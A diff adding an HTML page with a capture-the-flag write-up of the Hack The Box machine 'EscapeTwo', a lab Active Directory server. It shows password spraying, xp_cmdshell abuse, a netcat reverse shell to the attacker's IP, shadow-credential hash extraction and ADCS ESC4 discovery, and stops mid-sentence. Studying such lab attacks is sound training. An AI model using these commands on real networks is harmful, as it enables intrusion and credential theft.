@@ -1,0 +1,609 @@
+{% load static %}
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Document</title>
+    <link rel="stylesheet" href="{% static 'EthHack/css/machines/machines.css' %}">
+</head>
+<body>
+    <h1 class="title">HTB EscapeTwo</h1>
+    <p class="text">Difficulty : Easy : UserDifficulty : 4.4</p>
+    <p class="text">I though it's Medium difficulty...</p>
+
+    <h2 class="subtitle">Enumeration</h2>
+    <div class="code-box"><pre><code>└─$ <u>sudo nmap -p- -sCV $IP --min-rate=10000</u>
+PORT      STATE SERVICE       VERSION
+53/tcp    open  domain        Simple DNS Plus
+88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2025-11-10 11:32:36Z)
+135/tcp   open  msrpc         Microsoft Windows RPC
+139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
+389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: sequel.htb0., Site: Default-First-Site-Name)
+| ssl-cert: Subject: 
+| Subject Alternative Name: DNS:DC01.sequel.htb, DNS:sequel.htb, DNS:SEQUEL
+| Not valid before: 2025-06-26T11:46:45
+|_Not valid after:  2124-06-08T17:00:40
+|_ssl-date: 2025-11-10T11:34:14+00:00; -1s from scanner time.
+445/tcp   open  microsoft-ds?
+464/tcp   open  kpasswd5?
+593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
+636/tcp   open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: sequel.htb0., Site: Default-First-Site-Name)
+|_ssl-date: 2025-11-10T11:34:14+00:00; 0s from scanner time.
+| ssl-cert: Subject: 
+| Subject Alternative Name: DNS:DC01.sequel.htb, DNS:sequel.htb, DNS:SEQUEL
+| Not valid before: 2025-06-26T11:46:45
+|_Not valid after:  2124-06-08T17:00:40
+1433/tcp  open  ms-sql-s      Microsoft SQL Server 2019 15.00.2000.00; RTM
+| ms-sql-info: 
+|   10.129.232.128:1433: 
+|     Version: 
+|       name: Microsoft SQL Server 2019 RTM
+|       number: 15.00.2000.00
+|       Product: Microsoft SQL Server 2019
+|       Service pack level: RTM
+|       Post-SP patches applied: false
+|_    TCP port: 1433
+| ms-sql-ntlm-info: 
+|   10.129.232.128:1433: 
+|     Target_Name: SEQUEL
+|     NetBIOS_Domain_Name: SEQUEL
+|     NetBIOS_Computer_Name: DC01
+|     DNS_Domain_Name: sequel.htb
+|     DNS_Computer_Name: DC01.sequel.htb
+|     DNS_Tree_Name: sequel.htb
+|_    Product_Version: 10.0.17763
+|_ssl-date: 2025-11-10T11:34:14+00:00; -1s from scanner time.
+| ssl-cert: Subject: commonName=SSL_Self_Signed_Fallback
+| Not valid before: 2025-11-10T11:30:24
+|_Not valid after:  2055-11-10T11:30:24
+3269/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: sequel.htb0., Site: Default-First-Site-Name)
+|_ssl-date: 2025-11-10T11:34:14+00:00; 0s from scanner time.
+| ssl-cert: Subject: 
+| Subject Alternative Name: DNS:DC01.sequel.htb, DNS:sequel.htb, DNS:SEQUEL
+| Not valid before: 2025-06-26T11:46:45
+|_Not valid after:  2124-06-08T17:00:40
+5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
+|_http-server-header: Microsoft-HTTPAPI/2.0
+|_http-title: Not Found
+9389/tcp  open  mc-nmf        .NET Message Framing
+47001/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
+|_http-title: Not Found
+|_http-server-header: Microsoft-HTTPAPI/2.0
+49664/tcp open  msrpc         Microsoft Windows RPC
+49665/tcp open  msrpc         Microsoft Windows RPC
+49666/tcp open  msrpc         Microsoft Windows RPC
+49667/tcp open  msrpc         Microsoft Windows RPC
+49691/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
+49692/tcp open  msrpc         Microsoft Windows RPC
+49693/tcp open  msrpc         Microsoft Windows RPC
+49710/tcp open  msrpc         Microsoft Windows RPC
+49726/tcp open  msrpc         Microsoft Windows RPC
+49736/tcp open  msrpc         Microsoft Windows RPC</code></pre></div>
+
+
+<p class="text">We have to consider how to leverage four open ports : </p>
+<p class="text">1. MSSQL <br>
+2. ldap <br>
+3. smb <br>
+4. evil</p>
+<p class="text">Since we have credential for rose / KxEPkKe6R8su, we can start on any of them. </p>
+<p class="text">SMB often contains interesting information, so let's get start from SMB enumeration.</p>
+
+<div class="code-box"><pre><code>└─$ crackmapexec smb $IP -u rose -p 'KxEPkKe6R8su' --shares
+SMB         10.129.27.62    445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:sequel.htb) (signing:True) (SMBv1:False)
+SMB         10.129.27.62    445    DC01             [+] sequel.htb\rose:KxEPkKe6R8su 
+SMB         10.129.27.62    445    DC01             [+] Enumerated shares
+SMB         10.129.27.62    445    DC01             Share           Permissions     Remark
+SMB         10.129.27.62    445    DC01             -----           -----------     ------
+SMB         10.129.27.62    445    DC01             Accounting Department READ            
+SMB         10.129.27.62    445    DC01             ADMIN$                          Remote Admin
+SMB         10.129.27.62    445    DC01             C$                              Default share
+SMB         10.129.27.62    445    DC01             IPC$            READ            Remote IPC
+SMB         10.129.27.62    445    DC01             NETLOGON        READ            Logon server share 
+SMB         10.129.27.62    445    DC01             SYSVOL          READ            Logon server share 
+SMB         10.129.27.62    445    DC01             Users           READ  </code></pre></div>
+
+<p class="text">We have two not-default shares <u>Users</u> and <u>Accounting Department</u>(I don't say I dismissed Accounting share since the READ Permission is disorganized...).</p>
+<p class="text">Both are interesting, but there was no juicy information in Users share. </p>
+<div class="code-box"><pre><code>└─$ smbclient //$IP/"Accounting Department" -U "rose%KxEPkKe6R8su"
+Try "help" to get a list of possible commands.
+smb: \> dir
+  .                                   D        0  Sun Jun  9 06:52:21 2024
+  ..                                  D        0  Sun Jun  9 06:52:21 2024
+  accounting_2024.xlsx                A    10217  Sun Jun  9 06:14:49 2024
+  accounts.xlsx                       A     6780  Sun Jun  9 06:52:07 2024
+
+                6367231 blocks of size 4096. 925952 blocks available
+smb: \> </code></pre></div>
+
+<p class="text">There are two Windows Excel files. Since they consists several separeted files, we can unzip them and read raw-texts on linux machine.</p>
+<div class="code-box"><pre><code>└─$ unzip accounts.xlsx
+└─$ ls -R | grep -i xml
+[Content_Types].xml
+DefaultLayouts.xml
+app.xml
+core.xml
+custom.xml
+sharedStrings.xml
+styles.xml
+workbook.xml
+workbook.xml.rels
+theme1.xml
+sheet1.xml
+sheet1.xml.rels</code></pre></div>
+<p class="text">There are several inflated xml files. Argurably the most interesting file is sharedStrings.xml. </p>
+<p class="text">In the file xl/sharedString.xml, I found 4 user's credentials.</p>
+<p class="text">angela@sequel.htb : 0fwz7Q4mSpurIt99 <br>oscar@sequel.htb : 86LxLBMgEWaKUnBG <br>kevin@sequel.htb : Md9Wlq1E5bZnVDVo <br> sa@sequel.htb : MSSQLP@ssw0rd!</p>
+<p class="text">Then, we can brute-force this passwords against domain users.</p>
+<p class="text">For that purpose, we need to collect usernames in the target domain.</p>
+<div class="code-box"><pre><code>└─$ crackmapexec smb 10.129.27.62 -u rose -p 'KxEPkKe6R8su' --users
+SMB         10.129.27.62    445    NONE             [*]  x64 (name:) (domain:) (signing:True) (SMBv1:False)
+SMB         10.129.27.62    445    NONE             [+] \rose:KxEPkKe6R8su 
+SMB         10.129.27.62    445    NONE             [+] Enumerated domain user(s)
+SMB         10.129.27.62    445    NONE             sequel.htb\ca_svc                         badpwdcount: 0 desc: 
+SMB         10.129.27.62    445    NONE             sequel.htb\rose                           badpwdcount: 16 desc: 
+SMB         10.129.27.62    445    NONE             sequel.htb\sql_svc                        badpwdcount: 0 desc: 
+SMB         10.129.27.62    445    NONE             sequel.htb\oscar                          badpwdcount: 2 desc: 
+SMB         10.129.27.62    445    NONE             sequel.htb\ryan                           badpwdcount: 0 desc: 
+SMB         10.129.27.62    445    NONE             sequel.htb\michael                        badpwdcount: 1 desc: 
+SMB         10.129.27.62    445    NONE             sequel.htb\krbtgt                         badpwdcount: 1 desc: Key Distribution Center Service Account                                                                                                        
+SMB         10.129.27.62    445    NONE             sequel.htb\Guest                          badpwdcount: 1 desc: Built-in account for guest access to the computer/domain                                                                                       
+SMB         10.129.27.62    445    NONE             sequel.htb\Administrator                  badpwdcount: 0 desc: Built-in account for administering the computer/domain </code></pre></div>
+
+<p class="text">Copy and paste this output to any file and create userlist.</p>
+<div class="code-box"><pre><code>└─$ grep -oP '(?i)(?<=sequel.htb\\)[^:\s\)\\]+' users
+ca_svc
+rose
+sql_svc
+oscar
+ryan
+michael
+krbtgt
+Guest
+Administrator
+                                                                                                                                 
+┌──(kali㉿kali)-[~/tempo]
+└─$ grep -oP '(?i)(?&lt;=sequel.htb\\)[^:\s\)\\]+' users > users.txt</code></pre></div>
+<p class="text">Also we have to create passwordlist.</p>
+<div class="code-box"><pre><code>echo 'MSSQLP@ssw0rd!
+Md9Wlq1E5bZnVDVo
+0fwz7Q4mSpurIt99
+86LxLBMgEWaKUnBG' > password.txt</code></pre></div>
+
+<p class="text">But it's worth noting that the credential <u>sa@sequel.htb : MSSQLP@ssw0rd!</u> isn't appeared on the users output from crackmapexec. </p>
+<p class="text">Since it's possible that the user sa user is MSSQL user, we have to check that after password brute-force.</p>
+
+<div class="code-box"><pre><code>└─$ crackmapexec smb 10.129.27.62 -u users.txt -p password.txt
+SMB         10.129.27.62    445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:sequel.htb) (signing:True) (SMBv1:False)
+SMB         10.129.27.62    445    DC01             [-] sequel.htb\ca_svc:MSSQLP@ssw0rd! STATUS_USER_SESSION_DELETED 
+SMB         10.129.27.62    445    DC01             [-] sequel.htb\ca_svc:Md9Wlq1E5bZnVDVo STATUS_USER_SESSION_DELETED 
+SMB         10.129.27.62    445    DC01             [-] sequel.htb\ca_svc:0fwz7Q4mSpurIt99 STATUS_USER_SESSION_DELETED 
+SMB         10.129.27.62    445    DC01             [-] sequel.htb\ca_svc:86LxLBMgEWaKUnBG STATUS_USER_SESSION_DELETED 
+SMB         10.129.27.62    445    DC01             [-] sequel.htb\rose:MSSQLP@ssw0rd! STATUS_LOGON_FAILURE 
+SMB         10.129.27.62    445    DC01             [-] Connection Error: The NETBIOS connection with the remote host timed out.
+SMB         10.129.27.62    445    DC01             [-] sequel.htb\rose:0fwz7Q4mSpurIt99 STATUS_LOGON_FAILURE 
+SMB         10.129.27.62    445    DC01             [-] sequel.htb\rose:86LxLBMgEWaKUnBG STATUS_LOGON_FAILURE 
+SMB         10.129.27.62    445    DC01             [-] sequel.htb\sql_svc:MSSQLP@ssw0rd! STATUS_LOGON_FAILURE 
+SMB         10.129.27.62    445    DC01             [-] sequel.htb\sql_svc:Md9Wlq1E5bZnVDVo STATUS_LOGON_FAILURE 
+SMB         10.129.27.62    445    DC01             [-] sequel.htb\sql_svc:0fwz7Q4mSpurIt99 STATUS_LOGON_FAILURE 
+SMB         10.129.27.62    445    DC01             [-] Connection Error: The NETBIOS connection with the remote host timed out.
+SMB         10.129.27.62    445    DC01             [-] sequel.htb\oscar:MSSQLP@ssw0rd! STATUS_USER_SESSION_DELETED 
+<u>SMB         10.129.27.62    445    DC01             [+] sequel.htb\oscar:86LxLBMgEWaKUnBG </u>
+SMB         10.129.27.62    445    DC01             [-] Connection Error: The NETBIOS connection with the remote host timed out.
+SMB         10.129.27.62    445    DC01             [-] sequel.htb\oscar:86LxLBMgEWaKUnBG STATUS_USER_SESSION_DELETED 
+SMB         10.129.27.62    445    DC01             [-] Connection Error: The NETBIOS connection with the remote host timed out.
+SMB         10.129.27.62    445    DC01             [-] sequel.htb\ryan:Md9Wlq1E5bZnVDVo STATUS_USER_SESSION_DELETED 
+SMB         10.129.27.62    445    DC01             [-] sequel.htb\ryan:0fwz7Q4mSpurIt99 STATUS_USER_SESSION_DELETED 
+SMB         10.129.27.62    445    DC01             [-] sequel.htb\ryan:86LxLBMgEWaKUnBG STATUS_LOGON_FAILURE 
+SMB         10.129.27.62    445    DC01             [-] Connection Error: The NETBIOS connection with the remote host timed out.
+SMB         10.129.27.62    445    DC01             [-] sequel.htb\michael:Md9Wlq1E5bZnVDVo STATUS_LOGON_FAILURE 
+SMB         10.129.27.62    445    DC01             [-] Connection Error: The NETBIOS connection with the remote host timed out.
+SMB         10.129.27.62    445    DC01             [-] Connection Error: The NETBIOS connection with the remote host timed out.
+SMB         10.129.27.62    445    DC01             [-] sequel.htb\krbtgt:MSSQLP@ssw0rd! STATUS_LOGON_FAILURE 
+SMB         10.129.27.62    445    DC01             [-] sequel.htb\krbtgt:Md9Wlq1E5bZnVDVo STATUS_LOGON_FAILURE 
+SMB         10.129.27.62    445    DC01             [-] Connection Error: The NETBIOS connection with the remote host timed out.
+SMB         10.129.27.62    445    DC01             [-] Connection Error: The NETBIOS connection with the remote host timed out.
+SMB         10.129.27.62    445    DC01             [-] sequel.htb\Guest:MSSQLP@ssw0rd! STATUS_USER_SESSION_DELETED 
+SMB         10.129.27.62    445    DC01             [-] sequel.htb\Guest:Md9Wlq1E5bZnVDVo STATUS_USER_SESSION_DELETED 
+SMB         10.129.27.62    445    DC01             [-] Connection Error: The NETBIOS connection with the remote host timed out.
+SMB         10.129.27.62    445    DC01             [-] sequel.htb\Guest:86LxLBMgEWaKUnBG STATUS_LOGON_FAILURE 
+SMB         10.129.27.62    445    DC01             [-] sequel.htb\Administrator:MSSQLP@ssw0rd! STATUS_LOGON_FAILURE 
+SMB         10.129.27.62    445    DC01             [-] Connection Error: The NETBIOS connection with the remote host timed out.
+SMB         10.129.27.62    445    DC01             [-] sequel.htb\Administrator:0fwz7Q4mSpurIt99 STATUS_LOGON_FAILURE 
+SMB         10.129.27.62    445    DC01             [-] sequel.htb\Administrator:86LxLBMgEWaKUnBG STATUS_LOGON_FAILURE</code></pre></div>
+<p class="text">We discovered that the oscar's password is valid. However, we have MSSQL passoword with sa accaount. So it's worth trying to login to MSSQL as the user.</p>
+
+<div class="code-box"><pre><code>└─$ impacket-mssqlclient sequel.htb/sa:"MSSQLP@ssw0rd\!"@dc01.sequel.htb     
+Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 
+
+[*] Encryption required, switching to TLS
+[*] ENVCHANGE(DATABASE): Old Value: master, New Value: master
+[*] ENVCHANGE(LANGUAGE): Old Value: , New Value: us_english
+[*] ENVCHANGE(PACKETSIZE): Old Value: 4096, New Value: 16192
+[*] INFO(DC01\SQLEXPRESS): Line 1: Changed database context to 'master'.
+[*] INFO(DC01\SQLEXPRESS): Line 1: Changed language setting to us_english.
+[*] ACK: Result: 1 - Microsoft SQL Server (150 7208) 
+[!] Press help for extra shell commands
+SQL (sa  dbo@master)> <u>SELECT * FROM fn_my_permissions(NULL, 'SERVER');</u>
+entity_name   subentity_name   permission_name                   
+-----------   --------------   -------------------------------   
+server                         CONNECT SQL                       
+
+server                         SHUTDOWN                          
+
+server                         CREATE ENDPOINT                   
+
+server                         CREATE ANY DATABASE               
+
+server                         CREATE AVAILABILITY GROUP         
+
+server                         ALTER ANY LOGIN                   
+
+server                         ALTER ANY CREDENTIAL              
+
+server                         ALTER ANY ENDPOINT                
+
+server                         ALTER ANY LINKED SERVER           
+
+server                         ALTER ANY CONNECTION              
+
+server                         ALTER ANY DATABASE                
+
+server                         ALTER RESOURCES                   
+
+server                         ALTER SETTINGS                    
+
+server                         ALTER TRACE                       
+
+server                         ALTER ANY AVAILABILITY GROUP      
+
+server                         ADMINISTER BULK OPERATIONS        
+
+server                         AUTHENTICATE SERVER               
+
+server                         EXTERNAL ACCESS ASSEMBLY          
+
+server                         VIEW ANY DATABASE                 
+
+server                         VIEW ANY DEFINITION               
+
+server                         VIEW SERVER STATE                 
+
+server                         CREATE DDL EVENT NOTIFICATION     
+
+server                         CREATE TRACE EVENT NOTIFICATION   
+
+server                         ALTER ANY EVENT NOTIFICATION      
+
+server                         ALTER SERVER STATE                
+
+server                         UNSAFE ASSEMBLY                   
+
+server                         ALTER ANY SERVER AUDIT            
+
+server                         CREATE SERVER ROLE                
+
+server                         ALTER ANY SERVER ROLE             
+
+server                         ALTER ANY EVENT SESSION           
+
+server                         CONNECT ANY DATABASE              
+
+server                         IMPERSONATE ANY LOGIN             
+
+server                         SELECT ALL USER SECURABLES        
+
+server                         CONTROL SERVER                    
+
+SQL (sa  dbo@master)> </code></pre></div>
+
+<p class="text">Since the sa user is highly privileged, we can send reverse shell using xp_cmdshell functionality.</p>
+<div class="code-box"><pre><code>SQL (sa  dbo@master)> enable_xp_cmdshell
+INFO(DC01\SQLEXPRESS): Line 185: Configuration option 'show advanced options' changed from 1 to 1. Run the RECONFIGURE statement to install.
+INFO(DC01\SQLEXPRESS): Line 185: Configuration option 'xp_cmdshell' changed from 0 to 1. Run the RECONFIGURE statement to install.
+SQL (sa  dbo@master)> xp_cmdshell whoami
+output           
+--------------   
+<u>sequel\sql_svc</u>  </code></pre></div>
+<p class="text">The target is running under the sql_svc user spn.</p>
+<p class="text">To get reverse shell, we can use nc64.exe on the target machine via impacket-smbserver.</p>
+<div class="code-box"><pre><code>└─$ impacket-smbserver share . -smb2support -username a -password a 
+└─$ nc -lvnp 4444</code></pre></div>
+
+<div class="code-box"><pre><code>SQL (sa  dbo@master)> xp_cmdshell net use \\10.10.16.38\share /user:a a
+output                                
+-----------------------------------   
+The command completed successfully.   
+
+SQL (sa  dbo@master)> xp_cmdshell \\10.10.16.38\share\nc.exe\nc64.exe -e cmd 10.10.16.38 4444</code></pre></div>
+<p class="text">※You have to download nc.exe via github.</p>
+
+<p class="text">Then, we get reverse shell.</p>
+<div class="code-box"><pre><code>└─$ nc -lvnp 4444
+listening on [any] 4444 ...
+connect to [10.10.16.38] from (UNKNOWN) [10.129.27.62] 58707
+Microsoft Windows [Version 10.0.17763.6659]
+(c) 2018 Microsoft Corporation. All rights reserved.
+
+C:\Windows\system32>whoami
+whoami
+sequel\sql_svc</code></pre></div>
+
+
+<h2 class="subtitle">Lateral Movement</h2>
+<div class="code-box"><pre><code>C:\>dir
+dir
+ Volume in drive C has no label.
+ Volume Serial Number is 3705-289D
+
+ Directory of C:\
+
+11/05/2022  11:03 AM    &lt;DIR>          PerfLogs
+01/04/2025  07:11 AM    &lt;DIR>          Program Files
+06/09/2024  07:37 AM    &lt;DIR>          Program Files (x86)
+06/08/2024  02:07 PM    &lt;DIR>          SQL2019
+06/09/2024  05:42 AM    &lt;DIR>          Users
+01/04/2025  08:10 AM    &lt;DIR>          Windows
+               0 File(s)              0 bytes
+               6 Dir(s)   3,793,723,392 bytes free</code></pre></div>
+
+               <p class="text">Under the root directory, there is a SQL2019 directory. It's highly possible that we can read sensitive file since we are sql_svc user.</p>
+
+               <div class="code-box"><pre><code>C:\SQL2019\ExpressAdv_ENU>dir
+dir
+ Volume in drive C has no label.
+ Volume Serial Number is 3705-289D
+
+ Directory of C:\SQL2019\ExpressAdv_ENU
+
+01/03/2025  07:29 AM    &lt;DIR>          .
+01/03/2025  07:29 AM    &lt;DIR>          ..
+06/08/2024  02:07 PM    &lt;DIR>          1033_ENU_LP
+09/24/2019  09:03 PM                45 AUTORUN.INF
+09/24/2019  09:03 PM               788 MEDIAINFO.XML
+06/08/2024  02:07 PM                16 PackageId.dat
+06/08/2024  02:07 PM    &lt;DIR>          redist
+06/08/2024  02:07 PM    &lt;DIR>          resources
+09/24/2019  09:03 PM           142,944 SETUP.EXE
+09/24/2019  09:03 PM               486 SETUP.EXE.CONFIG
+06/08/2024  02:07 PM               717 sql-Configuration.INI
+09/24/2019  09:03 PM           249,448 SQLSETUPBOOTSTRAPPER.DLL
+06/08/2024  02:07 PM    &lt;DIR>          x64
+               7 File(s)        394,444 bytes
+               6 Dir(s)   3,793,723,392 bytes free</code></pre></div>
+
+<p class="text">There is config ini file. It's might contain juicy information.</p>
+<div class="code-box"><pre><code>C:\SQL2019\ExpressAdv_ENU>type sql-Configuration.INI | findstr /i password
+type sql-Configuration.INI | findstr /i password
+SQLSVCPASSWORD="<u>WqSZAF6CysDQbGb3</u>"</code></pre></div>
+
+<p class="text">There is raw-text password. We can brute-force using this password again.</p>
+
+<div class="code-box"><pre><code>└─$ crackmapexec smb 10.129.27.62 -u users.txt -p WqSZAF6CysDQbGb3 <u>--continue-on-success</u>
+SMB         10.129.27.62    445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:sequel.htb) (signing:True) (SMBv1:False)
+SMB         10.129.27.62    445    DC01             [-] sequel.htb\ca_svc:WqSZAF6CysDQbGb3 STATUS_LOGON_FAILURE 
+SMB         10.129.27.62    445    DC01             [-] sequel.htb\rose:WqSZAF6CysDQbGb3 STATUS_LOGON_FAILURE 
+SMB         10.129.27.62    445    DC01             <u>[+] sequel.htb\sql_svc:WqSZAF6CysDQbGb3 </u>
+SMB         10.129.27.62    445    DC01             [-] sequel.htb\oscar:WqSZAF6CysDQbGb3 STATUS_LOGON_FAILURE 
+SMB         10.129.27.62    445    DC01             <u>[+] sequel.htb\ryan:WqSZAF6CysDQbGb3</u>
+SMB         10.129.27.62    445    DC01             [-] sequel.htb\michael:WqSZAF6CysDQbGb3 STATUS_LOGON_FAILURE </code></pre></div>
+
+<p class="text">We found 2 users using the password we found. This is why we should use --continue-on-success flag if possible.</p>
+<div class="code-box"><pre><code>└─$ evil-winrm -i 10.129.27.62 -u ryan -p 'WqSZAF6CysDQbGb3'                       
+                                        
+Evil-WinRM shell v3.7
+                                        
+Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline
+                                        
+Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
+                                        
+Info: Establishing connection to remote endpoint
+*Evil-WinRM* PS C:\Users\ryan\Documents> </code></pre></div>
+<p class="text">Fortunately, we has PSRemote privilege. We got ryan's powershell.</p>
+
+<h2 class="subtitle">Privilege Escalation</h2>
+<p class="text">To gather information for PE, we have several choises. But always BlodHound is the most prioritized tool. To collect data to feed bloodhound, we need to upload SharpHound. I upload SharpHound.exe since I just prefer exe version.</p>
+<div class="code-box"><pre><code>*Evil-WinRM* PS C:\Users\ryan\Documents> upload ../bloodhound/SharpHound.exe
+                                        
+Info: Uploading /home/kali/tempo/../bloodhound/SharpHound.exe to C:\Users\ryan\Documents\SharpHound.exe
+                                        
+Data: 1748308 bytes of 1748308 bytes copied
+                                        
+Info: Upload successful!
+*Evil-WinRM* PS C:\Users\ryan\Documents> .\SharpHound.exe
+*Evil-WinRM* PS C:\Users\ryan\Documents> dir
+
+
+    Directory: C:\Users\ryan\Documents
+
+
+Mode                LastWriteTime         Length Name
+----                -------------         ------ ----
+-a----       11/10/2025  10:14 PM          38120 <u>20251110221444_BloodHound.zip</u>
+-a----       11/10/2025  10:14 PM           1469 NGZlZGJhNTUtZGMxZi00MzRhLTkxYzUtZWNjYjM1NGU4YzNl.bin
+-a----       11/10/2025  10:14 PM        1311232 SharpHound.exe
+-a----       11/10/2025  10:13 PM        1612229 SharpHound.ps1</code></pre></div>
+<p class="text">Download generated zip file. Let's analyze target's AD.</p>
+<div class="img">
+    <img src="{% static 'EthHack/images/escape2/1.png' %}" alt="">
+    <p class="text">Seeing the Outbound Object Control tab reveals Ryan have WriteOwner privilege against sa_svc user.</p>
+</div>
+<p class="text">This means we can get Owner right abusing this WriteOwner right.</p>
+<div class="img">
+    <img src="{% static 'EthHack/images/escape2/2.png' %}" alt="">
+    <p class="text">Also, the user sa_svc is a member of <u>CERT PUBLISHERS</u>. <br><br>From bloodhound note : <br><u>Members of this group are permitted to publish certificate to the directory</u> <br>Using this path, we might able to exploit vulnerable ADCS template.</p>
+</div>
+
+<p class="text">For that purpose, we have to pwn sa_svc user. We can use bloodyAD to get ownership of sa_svc user.</p>
+<div class="code-box"><pre><code>└─$ bloodyAD -d sequel.htb --host 10.129.27.62 -u ryan -p WqSZAF6CysDQbGb3 set owner ca_svc ryan
+[+] Old owner S-1-5-21-548670397-972687484-3496335370-512 is now replaced by ryan on ca_svc
+
+└─$ bloodyAD -d sequel.htb --host 10.129.27.62 -u ryan -p WqSZAF6CysDQbGb3 add genericAll ca_svc ryan
+[+] ryan has now GenericAll on ca_svc</code></pre></div>
+
+<p class="text">Then, we can create shadow credential.</p>
+<div class="list">
+    <p class="text blue">What is Shadow credential?</p>
+    <p class="text"><strong>Shadow credentials are illicit public-key credentials added to an AD account's KeyCredentialLink, enabling Kerberos PKINIT authentication (TGTs) without the account's password/NTLM hash.</strong></p>
+</div>
+
+<div class="code-box"><pre><code>└─$ certipy-ad shadow auto -u ryan@sequel.htb -p WqSZAF6CysDQbGb3 -account 'ca_svc' -dc-ip 10.129.27.62
+Certipy v4.8.2 - by Oliver Lyak (ly4k)
+
+[*] Targeting user 'ca_svc'
+[*] Generating certificate
+[*] Certificate generated
+[*] Generating Key Credential
+[*] Key Credential generated with DeviceID 'c3f0dc10-dfa8-2a09-d3e0-6602b00be249'
+[*] Adding Key Credential with device ID 'c3f0dc10-dfa8-2a09-d3e0-6602b00be249' to the Key Credentials for 'ca_svc'
+[*] Successfully added Key Credential with device ID 'c3f0dc10-dfa8-2a09-d3e0-6602b00be249' to the Key Credentials for 'ca_svc'
+[*] Authenticating as 'ca_svc' with the certificate
+[*] Using principal: ca_svc@sequel.htb
+[*] Trying to get TGT...
+[*] Got TGT
+[*] Saved credential cache to 'ca_svc.ccache'
+[*] Trying to retrieve NT hash for 'ca_svc'
+[*] Restoring the old Key Credentials for 'ca_svc'
+[*] Successfully restored the old Key Credentials for 'ca_svc'
+[*] NT hash for 'ca_svc': <u>3b181b914e7a9d5508ea1e20bc2b7fce</u></code></pre></div>
+<p class="text">We are now able to access full control of cs_svc user using extracted NTLM hash.</p>
+<p class="text">Using these right fully, we can publish weak ADCS certification if it exists.</p>
+<div class="code-box"><pre><code>└─$ certipy-ad find -u 'ca_svc' -hashes 3b181b914e7a9d5508ea1e20bc2b7fce -dc-ip 10.129.27.62 -vulnerable -stdout
+Certipy v4.8.2 - by Oliver Lyak (ly4k)
+
+[*] Finding certificate templates
+[*] Found 34 certificate templates
+[*] Finding certificate authorities
+[*] Found 1 certificate authority
+[*] Found 12 enabled certificate templates
+[*] Trying to get CA configuration for 'sequel-DC01-CA' via CSRA
+[!] Got error while trying to get CA configuration for 'sequel-DC01-CA' via CSRA: CASessionError: code: 0x80070005 - E_ACCESSDENIED - General access denied error.
+[*] Trying to get CA configuration for 'sequel-DC01-CA' via RRP
+[!] Failed to connect to remote registry. Service should be starting now. Trying again...
+[*] Got CA configuration for 'sequel-DC01-CA'
+[*] Enumeration output:
+Certificate Authorities
+  0
+    CA Name                             : sequel-DC01-CA
+    DNS Name                            : DC01.sequel.htb
+    Certificate Subject                 : CN=sequel-DC01-CA, DC=sequel, DC=htb
+    Certificate Serial Number           : 152DBD2D8E9C079742C0F3BFF2A211D3
+    Certificate Validity Start          : 2024-06-08 16:50:40+00:00
+    Certificate Validity End            : 2124-06-08 17:00:40+00:00
+    Web Enrollment                      : Disabled
+    User Specified SAN                  : Disabled
+    Request Disposition                 : Issue
+    Enforce Encryption for Requests     : Enabled
+    Permissions
+      Owner                             : SEQUEL.HTB\Administrators
+      Access Rights
+        ManageCertificates              : SEQUEL.HTB\Administrators
+                                          SEQUEL.HTB\Domain Admins
+                                          SEQUEL.HTB\Enterprise Admins
+        ManageCa                        : SEQUEL.HTB\Administrators
+                                          SEQUEL.HTB\Domain Admins
+                                          SEQUEL.HTB\Enterprise Admins
+        Enroll                          : SEQUEL.HTB\Authenticated Users
+Certificate Templates
+  0
+    Template Name                       : <u>DunderMifflinAuthentication</u>
+    Display Name                        : Dunder Mifflin Authentication
+    Certificate Authorities             : sequel-DC01-CA
+    Enabled                             : True
+    Client Authentication               : True
+    Enrollment Agent                    : False
+    Any Purpose                         : False
+    Enrollee Supplies Subject           : False
+    Certificate Name Flag               : SubjectRequireCommonName
+                                          SubjectAltRequireDns
+    Enrollment Flag                     : AutoEnrollment
+                                          PublishToDs
+    Private Key Flag                    : 16842752
+    Extended Key Usage                  : Client Authentication
+                                          Server Authentication
+    Requires Manager Approval           : False
+    Requires Key Archival               : False
+    Authorized Signatures Required      : 0
+    Validity Period                     : 1000 years
+    Renewal Period                      : 6 weeks
+    Minimum RSA Key Length              : 2048
+    Permissions
+      Enrollment Permissions
+        Enrollment Rights               : SEQUEL.HTB\Domain Admins
+                                          SEQUEL.HTB\Enterprise Admins
+      Object Control Permissions
+        Owner                           : SEQUEL.HTB\Enterprise Admins
+        Full Control Principals         : SEQUEL.HTB\Cert Publishers
+        Write Owner Principals          : SEQUEL.HTB\Domain Admins
+                                          SEQUEL.HTB\Enterprise Admins
+                                          SEQUEL.HTB\Administrator
+                                          SEQUEL.HTB\Cert Publishers
+        Write Dacl Principals           : SEQUEL.HTB\Domain Admins
+                                          SEQUEL.HTB\Enterprise Admins
+                                          SEQUEL.HTB\Administrator
+                                          SEQUEL.HTB\Cert Publishers
+        Write Property Principals       : SEQUEL.HTB\Domain Admins
+                                          SEQUEL.HTB\Enterprise Admins
+                                          SEQUEL.HTB\Administrator
+                                          SEQUEL.HTB\Cert Publishers
+    [!] Vulnerabilities
+      <u>ESC4</u>                              : 'SEQUEL.HTB\\Cert Publishers' has dangerous permissions</code></pre></div>
+
+      <div class="list">
+        <h1>ESC4</h1>
+        <p class="text"></p>
+    </div>
+
+
+<p class="text">Yeah, there is. We can </p>
